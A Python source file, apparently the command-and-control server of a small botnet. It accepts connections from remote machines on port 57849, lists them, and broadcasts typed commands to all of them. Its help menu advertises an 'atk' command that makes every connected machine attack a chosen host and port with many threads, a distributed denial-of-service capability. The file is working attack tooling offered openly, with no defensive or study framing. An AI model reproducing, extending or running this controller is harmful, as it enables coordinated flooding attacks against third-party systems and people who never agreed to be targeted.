import socket
import _thread
import requests
ThreadCount = 0
clients = []
connected = []

def help():
    print(""" Arguments between [] are required; arguments between () are optional.
    atk [host] [port] (threads) -> All machines connected will attack a host in the port that you specify with some threads(default: 100).
    list -> Lists all machines connected.
    print [text] -> Prints some text in all connected machines.
    help -> Displays the help menu.
    """)

def list():
    print(''.join(i for i in connected))

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    s.connect(("8.8.8.8", 1)) # creates a connection to Google's DNS
    priv_ip = s.getsockname()[0] # gets the private IP of the machine that connected to Google
    r = requests.get("https://ifconfig.me") # makes a request to ifconfig.me to get your public IP
    pub_ip = r.text # response text
    return priv_ip, pub_ip


def new_client(address):
    print(f"Connection received from {address[0]}")
    while True:
        command = input(">>>")
        if command == "help":
            help()
            
        elif command == "list":
            list()
            
        else:
            for client in clients:
                client.send(b'\r\n' + bytes(command, encoding='utf-8')) # sends the command to all clients. Needs \r\n to make the text tidy


def listen():
    addr = ("", 57849)
    priv_ip, pub_ip = get_ip() # unpacks the return values
    print(f"Private IP -> {priv_ip}")
    print(f"Public IP -> {pub_ip}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # another socket
    s.bind(addr)  # binds to all network interfaces on port 57849, you could replace "" on addr with 0.0.0.0 or the IP address of the interface you want it to bind
    s.listen()  # listens for connections
    while True:
        conn, address = s.accept()
        clients.append(conn) # appends the connection to a clients list. That list is used to send the message to all the clients
        connected.append(address[0])
        _thread.start_new_thread(new_client, (address,))  # new thread for each client, that way it can handle multiple clients


if __name__ == "__main__":
    listen()
